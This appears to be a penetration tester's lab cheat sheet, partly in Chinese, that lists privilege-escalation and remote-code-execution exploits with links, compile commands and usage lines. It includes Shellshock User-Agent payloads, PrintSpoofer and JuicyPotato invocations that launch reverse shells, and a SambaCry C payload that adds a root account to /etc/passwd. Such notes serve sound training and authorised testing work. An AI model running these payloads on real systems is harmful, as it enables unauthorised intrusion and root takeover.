# Exploit
## Some useful exploit
* AD noPac
    * 有低權限 Domain users 時提權用
    * https://github.com/Ridter/noPac
* CVE-2021-3156 Sudo Baron Samedit
    * exploit_nss.py
    * Sudo versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1
    * https://github.com/worawit/CVE-2021-3156
* DirtyCOW
    * https://github.com/FireFart/dirtycow
* Ethernal Blue
    * [MS17-010](https://github.com/helviojunior/MS17-010)
    * [usage example](https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/)

## Kernel Exploit
* [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
    * Test on Kernel 4.4.0 (4.4.0-116-generic)
    * `gcc cve-2017-16995.c -o cve-2017-16995`
* Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit
    * [CVE-2012-0056 (memodipper)](https://github.com/lucyoa/kernel-exploits/blob/master/memodipper/memodipper.c)
    * `gcc memodipper.c -o m.out`
* Linux Kernel < 2.6.36-rc1 CAN BCM Privilege Escalation Exploit
    * [CVE-2010-2959 (i-can-haz-modharden)](https://raw.githubusercontent.com/macubergeek/ctf/master/privilege%20escalation/i-can-haz-modharden.c)
* Compile for old OS
    * `gcc -m32 ./{INPUT.c) -o {OUTPUT} -Wl,--hash-style=both`
* [Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation](https://www.exploit-db.com/exploits/44298)
* [Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation](https://www.exploit-db.com/exploits/14814)
* [CVE-2009-2698](https://github.com/xiaoxiaoleo/CVE-2009-2698)
    * `gcc -m32 ./36108.c -o test -Wl,--hash-style=both`
* [Linux Kernel 2.6.39 < 3.2.2 (x86/x64) - 'Mempodipper' Local Privilege Escalation (2)](https://www.exploit-db.com/exploits/35161)
* [Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation](https://www.exploit-db.com/exploits/45010)
* [PolicyKit-1 0.105-31 - Privilege Escalation](https://www.exploit-db.com/exploits/50689)

## Impersonate Privilege
* [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
    ```
    ./PrintSpoofer64.exe -i -c <shell.exe>
    ```
* [Juicy Potato](https://github.com/ohpe/juicy-potato)
    ```!
    JuicyPotato.exe -l 4444 -p <reverse.exe> -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
    ```

## Exploit neat
### Shell Shock
* Exist some path like `/cgi-bin/*.sh`
    * `dirsearch.py -u http://{IP}/cgi-bin -e cgi`
* Add `() { :;}; echo; /usr/bin/id` to User-Agent
    * Must use Absolute path
    * `User-Agent: (){ :; }; /bin/ping -c 1 {MY_IP}`
* nmap test
    * `nmap {IP} -p {PORT} --script=http-shellshock --script-args uri=/cgi-bin/{FILE_NAME}.cgi`
### Werkzeug
*  Debug Page RCE
    -   [https://github.com/its-arun/Werkzeug-Debug-RCE](https://github.com/its-arun/Werkzeug-Debug-RCE)

### CVE-2017-7494 SambaCry , linux/samba/is_known_pipename
* Check vuln
    * `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 -Pn {IP}`
* Check share dir
    * `nmap --script=smb-enum-shares -p445 -Pn {IP}`
* https://github.com/joxeankoret/CVE-2017-7494
    * `python2 cve_2017_7494.py -t 10.11.1.146 --custom command.so`
* `gcc -o command.so -shared command.c -fPIC`
```C= !
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
int samba_init_module(void)
{
  setresuid(0,0,0); 
  system("echo root1:yeDupmFJ8ut/w:0:0:root:/root:/bin/bash >> /etc/passwd");
  return 0;
}
```
### Symlink Directory Traversal ( < 3.4.5)
* Tested on 3.0.24
    * [https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually](https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually)
* Samba 2.2.x - Remote Buffer Overflow
    * Tested on 2.2.7a
    * [https://www.exploit-db.com/exploits/7](https://www.exploit-db.com/exploits/7)
### SSH `authorized_keys` Brute force
- `/var/backups/ssh/authorized_keys` or `~/.ssh/authorized_keys`
- https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process
    - `git clone https://github.com/g0tmi1k/debian-ssh`
    - `tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2`
    - `cd debian-ssh/common_keys/dsa/1024/`
    - `grep -lr '{keys}'`
    - Find the file name without `.pub` is secret key

## Windows Priv
* MS16-032
    * Default act windows pop, need modified
    * https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
* churrasco (MS09–012)
    * XP, 2003 2008 
    * https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco
* ref
    * https://ithelp.ithome.com.tw/articles/10282035

## Used in lab
### RCE
* [CompleteFTP Professional 12.1.3 - Remote Code Execution](https://www.exploit-db.com/exploits/48657)
    * 需要 username 和 hash
* [Cacti 1.2.8 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/48145)
    * 需要改一下條件，因 req 不一定對
* [Sony Playstation 4 (PS4) < 7.02 / FreeBSD 9 / FreeBSD 12 - 'ip6_setpktopt' Kernel Local Privilege Escalation (PoC)](https://www.exploit-db.com/exploits/48644)
    * 依版本需要看要不要加 `#define FBSD12`
* [freeFTPd-1.0.10---PASS-Remote-Buffer-Overflow](https://github.com/ivanitlearning/freeFTPd-1.0.10---PASS-Remote-Buffer-Overflow/blob/master/freeFTPd.py)
    * 需要改 payload、port、host
* [Attacking Adobe ColdFusion](https://pentest.tonyng.net/attacking-adobe-coldfusion/)
* [OTRS 5.0.x/6.0.x - Remote Command Execution (1)](https://www.exploit-db.com/exploits/43853)
    * 需要登入頁面的帳密
* [HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)](https://www.exploit-db.com/exploits/49584)
* [PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injection](https://github.com/opsxcq/exploit-CVE-2014-6271)
* [Samba 2.2.x - Remote Buffer Overflow](https://www.exploit-db.com/exploits/7)
* [Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion](https://www.exploit-db.com/exploits/25971)
    * default: `admin : admin`
* [Samba 3.0.24 Directory Traversal Vulnerability](https://github.com/MarkBuffalo/exploits)
* [FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution](https://www.exploit-db.com/exploits/18650)
* [ApPHP MicroBlog 1.0.1 - Remote Command Execution](https://www.exploit-db.com/exploits/33070)
* [Advanced Comment System 1.0 - Multiple Remote File Inclusions](https://www.exploit-db.com/exploits/9623)
* [Apache James Server 2.3.2 - Remote Command Execution](https://www.exploit-db.com/exploits/35513)
* [Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure](https://www.exploit-db.com/exploits/2017)
    * [別人的拿 root 筆記](https://www.cnblogs.com/xiaoxiaoleo/p/8452767.html)
* [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)
* [RemoteMouse 3.008 - Arbitrary Remote Command Execution](https://www.exploit-db.com/exploits/46697)
* [Win10 MailCarrier 2.51 - 'POP3 User' Remote Buffer Overflow](https://www.exploit-db.com/exploits/47554)
* [WordPress Plugin AutoSuggest 0.24 - 'wpas_keys' SQL Injection](https://www.exploit-db.com/exploits/45977)
* [PhreeBooks 5.2.3 ERP - Remote Code Execution (2)](https://www.exploit-db.com/exploits/49524)

### Privilege
* [Serv-U FTP Server < 15.1.7 - Local Privilege Escalation](https://www.exploit-db.com/exploits/47009)
* [rbash bypass](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
    * `ssh <user>@<ip> -t "bash --noprofile"`
* [Exim 4.84-3 - Local Privilege Escalation](https://www.exploit-db.com/exploits/39535)
* [exacqVision ESM 5.12.2 - Privilege Escalation](https://www.exploit-db.com/exploits/46370)
* [2014-6271 postfix + procmail + formail ShellShock Exploit
](https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py)